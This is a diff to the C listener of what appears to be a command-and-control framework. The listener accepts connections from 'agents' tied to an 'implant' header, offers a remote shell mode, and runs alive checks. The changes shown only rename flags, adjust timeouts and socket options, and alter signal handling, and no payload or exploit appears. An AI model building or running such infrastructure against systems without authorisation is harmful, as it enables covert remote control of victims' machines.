@@ -8,6 +8,7 @@ This is the main file for the listener. It will do the following:
 
 */
 
+#define _POSIX_C_SOURCE 199309L
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -28,7 +29,7 @@ This is the main file for the listener. It will do the following:
 #include "utility.h"
 #include "implant.h"
 #include "queue.h"
-#include "base.h"
+#include "listener_utility.h"
 #include "listener_comms.h"
 #include "console.h"
 #include "listener_handler.h"
@@ -46,12 +47,12 @@ pthread_mutex_t listener_send_queue_lock;
 // Alarm flags
 volatile sig_atomic_t listener_alive_flag = false;
 // SIGINT flags
-volatile sig_atomic_t all_sigint = false;
+volatile sig_atomic_t listener_exit_flag = false;
 volatile sig_atomic_t shell_sigint = false;
 volatile sig_atomic_t shell_flag = false;
 
 void sigint_handler(int sig){
-    (shell_flag) ? (shell_sigint = true) : (all_sigint = true);
+    (shell_flag) ? (shell_sigint = true) : exit(RET_OK);
 }
 
 void listener_alive_alarm(int sig){
@@ -59,19 +60,23 @@ void listener_alive_alarm(int sig){
 }
 
 void *check_alive_thread(void *vargp){
+    int retval;
     Connected_Agents* CA = vargp;
     struct sigaction sa = {0};
+    struct timespec tv;
 
     // set signal hander for SIGALRM
     sa.sa_handler = &listener_alive_alarm;
     sa.sa_flags = 0;
     if (sigaction(SIGALRM, &sa, NULL) == -1){
         printf("ERROR sigaction SIGALRM\n");
-        all_sigint = true;
+        listener_exit_flag = true;
     }
 
     alarm(ALIVE_FREQUENCY);
-	while (!all_sigint){
+	while (!listener_exit_flag){
+        tv.tv_sec = 0;
+		tv.tv_nsec = TIMEOUT_CONST * 100000000;	// .1 seconds
 		if (listener_alive_flag){
             pthread_mutex_lock(&CA->lock);
 			// for (int i = 0; i < FDSIZE; i++){
@@ -86,7 +91,11 @@ void *check_alive_thread(void *vargp){
 			listener_alive_flag = false;
             alarm(ALIVE_FREQUENCY);
 		}
-        sleep(S_TIMEOUT);
+        retval = nanosleep(&tv, &tv);
+        if (retval == -1 && errno != EINTR){
+            printf("ERROR sigaction SIGALRM\n");
+            listener_exit_flag = true;
+        }
 	}
     debug_print("%s\n", "check_alive_thread done");
 	return 0;
@@ -102,13 +111,13 @@ int start_sockets(Connected_Agents* CA, int port){
 
     if ((listener_socket = socket(AF_INET, SOCK_STREAM, 0)) < 0){
         printf("Socket failed\n");
-        all_sigint = true;
+        listener_exit_flag = true;
         return RET_FATAL_ERROR;
     }
 
-    if (setsockopt(listener_socket, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))){
+    if (setsockopt(listener_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))){
         printf("setsockopt failed\n");
-        all_sigint = true;
+        listener_exit_flag = true;
         return RET_FATAL_ERROR;
     }
 
@@ -118,31 +127,31 @@ int start_sockets(Connected_Agents* CA, int port){
 
     if (bind(listener_socket, (struct sockaddr*)&addr, sizeof(addr)) < 0){
         printf("bind failed\n");
-        all_sigint = true;
+        listener_exit_flag = true;
         return RET_FATAL_ERROR;
     }
 
     if (listen(listener_socket, LISTEN_BACKLOG) < 0){
         printf("listen failed\n");
-        all_sigint = true;
+        listener_exit_flag = true;
         return RET_FATAL_ERROR;
     }
 
     listener_pfd[0].fd = listener_socket;
     listener_pfd[0].events = POLLIN;
 
-    while (!all_sigint){
-        poll_count = poll(listener_pfd, 1, MS_TIMEOUT);
+    while (!listener_exit_flag){
+        poll_count = poll(listener_pfd, 1, TIMEOUT_CONST * 100);     // .1 seconds
         if (poll_count == -1 && errno != EINTR){
             printf("ERROR poll\n");
-            all_sigint = true;
+            listener_exit_flag = true;
             return RET_FATAL_ERROR;
 	    }
 
         if (poll_count > 0 && listener_pfd[0].revents & POLLIN){
             if ((agent_socket = accept(listener_socket, (struct sockaddr*)&addr, &addr_len)) < 0){
                 printf("accept failed\n");
-                all_sigint = true;
+                listener_exit_flag = true;
             }
             else if (agent_socket >= FDSIZE){
                 print_out("%s\n", "Agent connected but too many connections");
